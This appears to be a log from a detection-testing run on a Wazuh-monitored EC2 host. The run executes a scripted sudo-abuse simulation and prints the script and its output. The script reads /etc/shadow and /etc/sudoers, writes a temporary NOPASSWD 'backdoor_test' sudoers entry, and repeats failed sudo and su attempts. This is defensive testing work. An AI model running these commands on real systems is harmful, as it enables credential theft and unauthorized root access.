===============================================================================
[1;33mATTACK #07: Sudo Abuse[0m
===============================================================================
Target: ec2-54-204-182-4.compute-1.amazonaws.com
Category: Privilege Escalation

[0;32m[*] Attack started at: 2026-01-05T18:53:05+03:00[0m

[*] Commands to run on target agent:


#!/bin/bash
echo "[*] Sudo abuse / privilege escalation attack..."

# 1. Multiple failed sudo attempts (wrong password)
echo "[*] Simulating failed sudo attempts..."
for i in {1..10}; do
    echo "wrongpassword" | sudo -S ls /root 2>/dev/null
    sleep 0.5
done

# 2. Sudo to root shell
echo ""
echo "[*] Attempting sudo to root..."
sudo whoami
sudo id

# 3. Sudo with suspicious commands
echo ""
echo "[*] Running suspicious commands with sudo..."
sudo cat /etc/shadow | head -3
sudo cat /etc/sudoers | head -5
sudo ls -la /root/

# 4. Sudo -i (interactive root shell simulation)
echo ""
echo "[*] Simulating sudo -i..."
sudo -i bash -c "echo Running as root: $(whoami)"

# 5. Check sudo privileges (reconnaissance)
echo ""
echo "[*] Sudo reconnaissance..."
sudo -l 2>/dev/null

# 6. Sudo with NOPASSWD abuse simulation
echo ""
echo "[*] Checking for NOPASSWD entries..."
grep -r "NOPASSWD" /etc/sudoers /etc/sudoers.d/ 2>/dev/null

# 7. Attempt to modify sudoers (will likely fail without root)
echo ""
echo "[*] Attempting sudoers modification..."
echo "testuser ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/backdoor_test 2>/dev/null
sudo rm /etc/sudoers.d/backdoor_test 2>/dev/null

# 8. Sudo with environment variables (potential bypass)
echo ""
echo "[*] Testing sudo with environment preservation..."
sudo -E env | grep -i path | head -3

# 9. Su attempts
echo ""
echo "[*] Simulating su attempts..."
for i in {1..5}; do
    echo "wrongpass" | su - root 2>/dev/null
    sleep 0.5
done

# 10. SUID binary abuse check
echo ""
echo "[*] Searching for SUID binaries..."
find /usr/bin -perm -4000 2>/dev/null | head -10

echo ""
echo "[*] Privilege escalation simulation complete"

[*] Running attack via SSH using key /home/mohamad/.ssh/wazuh-agnet.pem ...
[*] Sudo abuse / privilege escalation attack...
[*] Simulating failed sudo attempts...
snap
snap
snap
snap
snap
snap
snap
snap
snap
snap

[*] Attempting sudo to root...
root
uid=0(root) gid=0(root) groups=0(root)

[*] Running suspicious commands with sudo...
root:*:20376:0:99999:7:::
daemon:*:20376:0:99999:7:::
bin:*:20376:0:99999:7:::
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
total 32
drwx------  6 root root 4096 Jan  5 15:52 .
drwxr-xr-x 20 root root 4096 Jan  5 13:39 ..
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  3 root root 4096 Jan  3 18:14 .launchpadlib
drwxr-xr-x  3 root root 4096 Jan  3 12:42 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
drwx------  2 root root 4096 Jan  3 04:36 .ssh
drwx------  4 root root 4096 Jan  3 04:36 snap

[*] Simulating sudo -i...
Running as root: ubuntu

[*] Sudo reconnaissance...
Matching Defaults entries for ubuntu on ip-172-31-28-229:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ubuntu may run the following commands on ip-172-31-28-229:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL

[*] Checking for NOPASSWD entries...

[*] Attempting sudoers modification...
testuser ALL=(ALL) NOPASSWD: ALL

[*] Testing sudo with environment preservation...
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus

[*] Simulating su attempts...

[*] Searching for SUID binaries...
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/fusermount3
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/su
/usr/bin/chfn

[*] Privilege escalation simulation complete

===============================================================================
[0;32m[âœ“] Attack script generated[0m
===============================================================================
Start Time: 2026-01-05T18:53:05+03:00
End Time: 2026-01-05T18:53:27+03:00

Expected Wazuh alerts:
  - Rule 5401: First time user executed sudo
  - Rule 5402: Failed attempt to run sudo
  - Rule 5403: Successful sudo to root
  - Rule 5404: User NOT in sudoers file
  - Rule 5405: sudo authentication failure

Data for CSV:
  attack_id: 07
  attack_name: Sudo Abuse
  category: Privilege Escalation
  attack_start_time: 2026-01-05T18:53:05+03:00
  attack_end_time: 2026-01-05T18:53:27+03:00
